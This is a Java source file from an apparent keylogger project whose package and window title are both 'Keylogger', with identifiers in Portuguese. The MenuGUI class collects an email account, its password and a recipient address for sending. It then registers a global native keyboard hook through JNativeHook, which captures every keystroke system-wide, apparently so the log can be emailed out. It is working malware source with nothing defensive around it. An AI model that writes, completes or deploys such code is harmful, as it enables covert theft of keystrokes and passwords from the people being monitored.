package br.com.keylogger;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class MenuGUI extends JFrame implements AcitivityIF {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JPanel panelM;
	private JFrame frame;
	private JButton okM;
	private JLabel labelMailM;
	private JTextField emailM;
	private JLabel labelPassM;
	private JPasswordField passwordM;
	private JLabel labelDestinatarioM;
	private JTextField destinatarioM;
	private Envio envio;
	private Captura captura;
	
	public MenuGUI(Envio envio, Captura captura) {
		this.initComponents();
		this.acaoBotoes();
		this.envio = envio;
		this.captura = captura;
	}

	@Override
	public void initComponents() {
		this.setLayout(null);
		this.panelM = new JPanel();
		this.panelM.setSize(200, 200);
		this.okM = new JButton("OK");
		this.labelMailM = new JLabel("Email");
		this.emailM = new JTextField(15);
		this.labelPassM = new JLabel("Password");
		this.passwordM = new JPasswordField(15);
		this.labelDestinatarioM = new JLabel("Destinatário");
		this.destinatarioM = new JTextField(15);
		this.frame = new JFrame("Keylogger");
		
		this.panelM.add(this.labelMailM);
		this.panelM.add(this.emailM);
		this.panelM.add(this.labelPassM);
		this.panelM.add(this.passwordM);
		this.panelM.add(this.labelDestinatarioM);
		this.panelM.add(this.destinatarioM);
		this.panelM.add(this.okM);
		
		this.frame.add(this.panelM);
		this.frame.setSize(200, 200);
		this.frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		//this.frame.pack();
		this.frame.setResizable(false);
		this.frame.setLocationRelativeTo(null);
		this.frame.setVisible(true);
	}
	
	@Override
	public void acaoBotoes() {
		this.okM.addActionListener(new ActionListener() {
			@SuppressWarnings("deprecation")
			@Override
			public void actionPerformed(ActionEvent e) {
				envio.setEmail(emailM.getText());
				envio.setPassword(passwordM.getText());
				envio.setDestinatario(destinatarioM.getText());
				JOptionPane.showMessageDialog(null, "Cadastrado com sucesso!");
				/**
				 * Registrar gancho para captura
				 */
				try {
					GlobalScreen.registerNativeHook();
				} catch(NativeHookException ex) {
					ex.printStackTrace();
				}
				
				/**
				 * Adicionar a classe de escuta
				 */
				GlobalScreen.addNativeKeyListener((Captura)captura);
			}
		});
	}
}
